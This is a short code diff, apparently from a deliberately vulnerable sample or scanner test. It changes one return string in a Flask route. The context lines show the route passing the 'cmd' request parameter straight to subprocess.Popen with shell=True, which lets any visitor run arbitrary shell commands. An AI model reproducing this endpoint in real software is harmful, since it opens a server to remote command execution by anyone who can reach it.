@@ -8,4 +8,4 @@ app = flask.Flask(__name__)
 def index():
     cmd = request.args.get("cmd")
     subprocess.Popen(cmd, shell=True)
-    return "not ok"
+    return "not ok!"
